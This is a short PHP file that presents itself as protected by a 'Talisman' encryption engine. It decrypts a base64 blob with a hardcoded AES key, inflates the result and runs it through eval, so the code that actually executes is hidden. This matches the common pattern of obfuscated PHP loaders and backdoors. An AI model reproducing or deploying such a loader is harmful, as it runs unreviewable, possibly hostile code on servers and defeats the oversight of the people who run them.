<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$ke8143 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p50818 = base64_decode('qa93Grjo5fezFsI1N6m0U1Nid3pyTk1VRlRLRkUxdDMydGU0Nk12N2IvMjNLdlZaMDlhZjlMbjVxV3JlNUwzWC9LRkpxWG8rS3dHMU9WVXkzK1B1d2NRM25MMCtsMVlwUVBUMTl2dFdXZ0ljYkNHVWFBNjlMYXUzYjFWbmpmV29ubElIQmFvbzhka1NmditXdkVkYVY1b1A0ajVRMG9NTDRkb2dmcWdZTkFnRERydmdTUUYvL0Q2NGRKdzJEUVduUEdLUmJJVUhPYXNMaEdZdlRVbmYxenY2MUd6bTdiVHNhNGNrd3BCMFdRSHVoNXNxY2NmeU9BK3c3MCs4M0czZEx6a2lmVlBZRnQ2d3l3U0xHQTZLSTRjSmdSb3hNbnVmOStQTmJFb3dGRk5jMS8yazNTd084NkwzVXZvPQ==');
$ia36f2 = openssl_cipher_iv_length('aes-256-cbc');
$vc4f4a = substr($p50818, 0, $ia36f2);
$c496a3 = substr($p50818, $ia36f2);
eval('?>'.gzinflate(openssl_decrypt($c496a3, 'aes-256-cbc', $ke8143, 0, $vc4f4a)));